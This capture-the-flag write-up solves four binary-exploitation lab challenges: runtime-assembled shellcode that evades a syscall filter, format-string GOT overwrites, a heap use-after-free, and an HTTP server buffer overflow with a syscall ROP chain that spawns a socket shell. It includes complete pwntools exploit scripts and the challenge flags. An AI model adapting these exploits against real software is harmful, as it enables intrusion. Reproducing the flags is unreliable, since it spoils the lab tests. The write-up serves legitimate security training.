# TryPwnMe Two — Full Write-up


## 1. TryExecMe 2 — shellcode with a syscall-byte filter

### Vulnerability
`main` maps a **RWX** page at the fixed address `0xcafe0000`, reads up to `0x80` bytes of
attacker input into it, passes it through `forbidden()`, then `call rdx` — i.e. it **executes
our bytes as shellcode**. `forbidden()` rejects the input if it contains any of the consecutive
byte-pairs:

- `0f 05` → `syscall`
- `0f 34` → `sysenter`
- `cd 80` → `int 0x80`

So we can run arbitrary code but cannot *include* a syscall instruction literally.

### Exploitation
Assemble the `syscall` opcode **at runtime**: build the bytes `0f 05` in a register and store
them into the instruction stream just before execution reaches it. The staging instructions
(`b3 0f`, `b7 05`, `66 89 19`, `48 8d 0d …`) contain none of the forbidden pairs.

```python
#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
sc = asm('''
    xor    rsi, rsi
    xor    rdx, rdx
    mov    rbx, 0x0068732f6e69622f   /* "/bin/sh\\0" */
    push   rbx
    mov    rdi, rsp
    push   0x3b                       /* execve */
    pop    rax
    mov    bl, 0x0f                   /* build syscall opcode in bx */
    mov    bh, 0x05
    lea    rcx, [rip+sc]
    mov    [rcx], bx                  /* self-write 0f 05 into 'sc' */
sc:
    .byte 0x90
    .byte 0x90
''')
assert all(b not in sc for b in (b'\x0f\x05', b'\x0f\x34', b'\xcd\x80'))

r = remote('10.49.149.179', 5002)
r.recvuntil(b'spell')
r.send(sc)
r.sendline(b'id; cat flag.txt')
print(r.recvrepeat(3).decode())
```

**Gotcha:** set `rax=0x3b` *before* building the opcode in `bx` (using `al/ah` would clobber `rax`).

**Flag:** `THM{TryExecMe-reveng3-with-no-s1sc4lls-nic3}`

---

## 2. Not Specified 2 — format string, non-PIE

### Vulnerability
```c
read(0, buf, 0x200);
printf("Thanks ");
printf(buf);        // <-- format string: user controls the format
exit(0x539);
```
A single user-controlled `printf`. The binary is **non-PIE** with **Partial RELRO**, so the GOT
lives at a fixed, writable address. Input lands at **format offset 6**.

### Exploitation (multi-round, looping via `exit@GOT`)
Each connection runs `main` once and then `exit()`. Overwriting `exit@GOT` → `main` turns it into a
loop, giving multiple format-string shots in one connection. Plan:

1. **R1:** write `exit@GOT = main` (so it loops instead of exiting).
2. **R2:** leak libc by `%s`-reading a GOT entry (`printf@GOT`).
3. **R3:** write `printf@GOT = system`.
4. **R4:** send `/bin/sh` — now `main`'s `printf(buf)` is `system("/bin/sh")` → shell.
   (The earlier `printf("Please…")`/`printf("Thanks ")` become harmless `system()` calls.)

```python
#!/usr/bin/env python3
from pwn import *
import time
context.arch='amd64'
PRINTF_OFF=0x60770; SYSTEM_OFF=0x50d60                 # from shipped libc 2.35
printf_got=0x404020; exit_got=0x404038; main=0x401280
OFF=6
r=remote('10.49.149.179',5000); r.recvuntil(b'username:')

# R1: exit@GOT = main  (loop)
r.sendline(fmtstr_payload(OFF, {exit_got: main}, write_size='short'))
r.recvuntil(b'username:')

# R2: leak printf@GOT via %s (address placed at arg 9 => buffer+24)
r.sendline(b'MARK%9$sMARK'.ljust(24,b'.') + p64(printf_got))
r.recvuntil(b'MARK'); leak=r.recvuntil(b'MARK', drop=True)
libc = u64(leak[:6].ljust(8,b'\0')) - PRINTF_OFF
system = libc + SYSTEM_OFF
log.success('libc=%#x system=%#x', libc, system)
r.recvuntil(b'username:')

# R3: printf@GOT = system
r.sendline(fmtstr_payload(OFF, {printf_got: system}, write_size='short'))
time.sleep(1)
# R4: trigger
r.sendline(b'/bin/sh'); time.sleep(1)
r.sendline(b'id; cat flag.txt'); time.sleep(2)
print(r.recvrepeat(3).decode('latin1','replace'))
```

Offsets from the shipped libc:
```bash
readelf -sW NotSpecified2/libc.so.6 | grep -wE 'printf|system'
# printf 0x60770 ; system 0x50d60
objdump -R NotSpecified2/notspecified2 | grep -iE 'printf|exit'   # GOT addresses
```

**Flag:** `THM{f0rm4t-str1ng-n0t-sp3cified-ag4in}`

---

## 3. Try a Note — heap use-after-free (glibc 2.35)

### Vulnerability
A note manager: `chunks[32]` pointer table, `sizes[32]`, monotonically-increasing `index`.
- **delete** calls `free(chunks[i])` but **never clears the pointer** → use-after-free / double-free.
- **update** only checks `chunks[i] != 0` → writes into a freed chunk (UAF write).
- **show** (menu `[2] Read`) `puts(chunks[i])` → leak primitive.
- **`win`** (menu `[5]`) is a built-in exploit gadget:
  ```c
  // reads idx, scanf("%lu", &arg), then:
  rdx = *(void**)chunks[idx];   // first 8 bytes of the note
  rdx(arg);                     // call it with a controlled argument
  ```
  i.e. **call `*chunk` with a controlled argument**.

### Exploitation
`win` turns the challenge into "put `system` in a chunk, pass `/bin/sh` as the arg". Only a libc
leak is needed:

1. Create a large note (`0x500`, > tcache max `0x408`) and a small guard note.
2. `delete` the large note → it enters the **unsorted bin**; its first 8 bytes become
   `main_arena+96` (a libc pointer).
3. `show` the freed note (`puts`) → leak → `libc_base = leak - (main_arena + 0x60)`.
4. `update` the guard note so its first 8 bytes = `system`.
5. `win(guard)` with arg = libc `"/bin/sh"` → `system("/bin/sh")` → shell.

```python
#!/usr/bin/env python3
from pwn import *
import time
context.arch='amd64'
MAIN_ARENA=0x219c80; SYSTEM=0x50d60; BINSH=0x1d8698     # shipped libc 2.35
r=remote('10.49.149.179',5001)
def menu(o): r.recvuntil(b'>>'); r.sendline(str(o).encode())
def create(sz,data):
    menu(1); r.recvuntil(b'entry size:'); r.sendline(str(sz).encode())
    r.recvuntil(b'entry data:'); r.send(data); r.recvuntil(b'created at index')
def delete(i): menu(4); r.recvuntil(b'index:'); r.sendline(str(i).encode()); r.recvuntil(b'deleted')
def update(i,data): menu(3); r.recvuntil(b'index:'); r.sendline(str(i).encode()); r.recvuntil(b'data:'); r.send(data)
def show_leak(i):
    menu(2); r.recvuntil(b'index:'); r.sendline(str(i).encode())
    raw=r.recvuntil(b'[1] Create')
    parts=[p for p in raw.split(b'\n') if p and b'Create' not in p]
    return u64(parts[0].ljust(8,b'\0'))

create(0x500, b'A'*8)       # idx0 -> unsorted bin on free
create(0x20,  b'B'*8)       # idx1 -> guard + win vehicle
delete(0)
libc = show_leak(0) - (MAIN_ARENA + 0x60)
system, binsh = libc+SYSTEM, libc+BINSH
log.success('libc=%#x system=%#x', libc, system)
update(1, p64(system))                       # chunks[1][0:8] = system
menu(5); r.recvuntil(b'index:'); r.sendline(b'1')   # win(1)
r.recvuntil(b':'); r.sendline(str(binsh).encode())  # %lu arg = "/bin/sh"
time.sleep(1); r.sendline(b'id; cat flag.txt'); time.sleep(2)
print(r.recvrepeat(3).decode('latin1','replace'))
```

Offsets:
```bash
readelf -sW TryaNote/libc.so.6 | awk '$8=="main_arena"{print $2}'   # 0x219c80
readelf -sW TryaNote/libc.so.6 | awk '$8=="system"{print $2;exit}'  # 0x50d60
strings -a -t x TryaNote/libc.so.6 | grep /bin/sh                    # 0x1d8698
```

**Flag:** `THM{l3arning-h3ap-1nt3rn4ls-with-the-b3ar}`

---

## 4. Slow Server — format-string leak + POST overflow → syscall ROP

A hand-rolled HTTP server (single process, `accept` loop, **no fork**, **PIE**, **no canary**, NX,
Full RELRO). `handle_request` tokenizes the request line (`strtok` on `" \t\r\n"`) into
`method / path / version` and dispatches `GET` (serves `index.html`), `POST`, and `DEBUG`.

### Two vulnerabilities, used together

**(a) Format string — `DEBUG` (used only to leak PIE base).**
```c
// handle_debug_request(fd, path)
sprintf(buf, path);          // path is the FORMAT STRING; result written back to client
```
`%136$p` returns an address inside `handle_request`; subtract `0x1780` → **PIE base**.

**(b) Stack overflow — `POST` (the ROP vector).**
```c
// handle_post_request(fd, path):   buffer is only 16 bytes
memcpy(buf /*rbp-0x10*/, path, 0x400);   // 1024-byte copy into a 16-byte buffer, no canary
```
`path` is the **request-line URI token** (in `main`'s buffer), and `memcpy` copies a fixed `0x400`
bytes from it — so the overflow is a raw byte copy that **allows null bytes** (unlike the format
string). Saved RBP is at buffer **offset 16**, the return address at **offset 24**.

### The gadget stub
The function `__security_Check` (`0x1803`) is a deliberate **syscall-ROP toolkit**:

| Addr (base+) | Gadget |
|---|---|
| `0x1807` | `push rbp ; mov rbp,rsp ; pop rax ; ret` |
| `0x180b` | `pop rax ; ret` |
| `0x180d` | `pop rdx ; pop r12 ; ret` |
| `0x1811` | `pop rsi ; ret` |
| `0x1813` | `syscall ; ret` |
| `0x1816` | `pop rdi ; xor rdi, rbp ; ret` |
| `0x181c` | `pop rbp ; ret` |

Full RELRO + no shipped libc → **no GOT overwrite / ret2libc; we ROP with syscalls** inside the binary.
`rdi` is loaded via `pop rdi ; xor rdi, rbp` (so set `rbp` first; with `rbp=0` the pop value passes
through). `"/bin/sh"` is placed on the stack by setting `rbp = "/bin/sh\0"` then running
`push rbp ; mov rbp,rsp ; pop rax` — afterwards `rbp` points at the pushed string, and
`pop rdi ; xor rdi,rbp` with `0` yields `rdi = &"/bin/sh"`.

### Two subtleties that make it work
1. **`strtok` vs. the chain.** `strtok` is called exactly 3× (method/path/version), zeroing only the
   first two delimiters. If the request line is laid out so the path- and version-tokens (and their
   two delimiter-nulls) all fall inside the **first 24 bytes** (the padding), then everything from
   offset 24 on — the ROP chain — is **never scanned**, so the chain may contain *any* bytes
   (nulls, `0x0d`, PIE high bytes). Layout: `POST ` + `"/ HTTP/1.1 "` + `13×'A'` + `CHAIN`.
2. **The POST body read.** The `POST` branch does a *second* `read(fd, heapbuf, 0x400)` for the body
   **before** calling `handle_post_request`. Send the request line, then a few body bytes to unblock
   that read; the overflow then fires.
3. **Socket to stdio.** `system`/`execve` would otherwise run on the server's stdio, so we
   `dup2(4, 0/1/2)` first (fd **4** = the accepted client socket) → the shell talks over *our*
   connection. `execve("/bin/sh", 0, 0)` then gives an interactive shell.

### Exploit
```python
#!/usr/bin/env python3
from pwn import *
import time
context.arch='amd64'
HOST,PORT='10.49.149.179',5555
def leak(n):
    r=remote(HOST,PORT,timeout=6); r.send(b'DEBUG %%%d$p HTTP/1.1\r\n\r\n'%n)
    d=r.recvrepeat(0.8); r.close(); return int(d[d.find(b'0x'):].split()[0],16)

B = leak(136) - 0x1780                                  # PIE base
g = lambda o: B+o
POP_RAX,POP_RDX_R12,POP_RSI,SYSCALL,POP_RDI_XOR,PUSH_RBP,POP_RBP = \
    g(0x180b),g(0x180d),g(0x1811),g(0x1813),g(0x1816),g(0x1807),g(0x181c)
BINSH=0x0068732f6e69622f; fd=4

chain=b''.join(p64(x) for x in [
    POP_RBP,0,                                          # rbp=0 (xor identity)
    POP_RAX,33, POP_RDI_XOR,fd, POP_RSI,0, SYSCALL,     # dup2(4,0)
    POP_RAX,33, POP_RDI_XOR,fd, POP_RSI,1, SYSCALL,     # dup2(4,1)
    POP_RAX,33, POP_RDI_XOR,fd, POP_RSI,2, SYSCALL,     # dup2(4,2)
    POP_RBP,BINSH, PUSH_RBP,                            # rbp -> &"/bin/sh" on stack
    POP_RDI_XOR,0, POP_RSI,0, POP_RDX_R12,0,0,          # rdi=&binsh, rsi=0, rdx=0
    POP_RAX,59, SYSCALL,                                # execve("/bin/sh",0,0)
])
# first 24 bytes consume strtok's path+version delimiters; chain (offset 24) is never scanned
req = b'POST ' + b'/ HTTP/1.1 ' + b'A'*13 + chain + b'\r\n'

r=remote(HOST,PORT,timeout=8)
r.send(req);        time.sleep(0.6)   # main() reads the request line
r.send(b'BODY\n');  time.sleep(0.8)   # unblock the POST body read -> overflow -> execve
r.sendline(b'id; cat flag.txt')
time.sleep(1.5)
print(r.recvrepeat(3).decode('latin1','replace'))
r.interactive()
```

Gadget discovery:
```bash
objdump -d -M intel SlowServer/slowserver | sed -n '/<__security_Check>:/,/181e/p'
```

**Lesson:** my first attempt tried to ROP through the *format string* path (ret2libc writing the
saved RIP with `%n`). That is far harder here (null-free format, output < `0x400`, Full RELRO, remote
libc) and — without a clean "resume" link — it **crashed the single-process server**. The intended
and correct vector is the **POST `memcpy` overflow** (null-tolerant) driving the in-binary
**syscall gadgets**, with `dup2` binding the shell to the socket.

**Flag:** `THM{ab4d-w3b-s3rv3r-g00d-rop-my-fr1end}`  (shell runs as `uid=999(ctf)`)
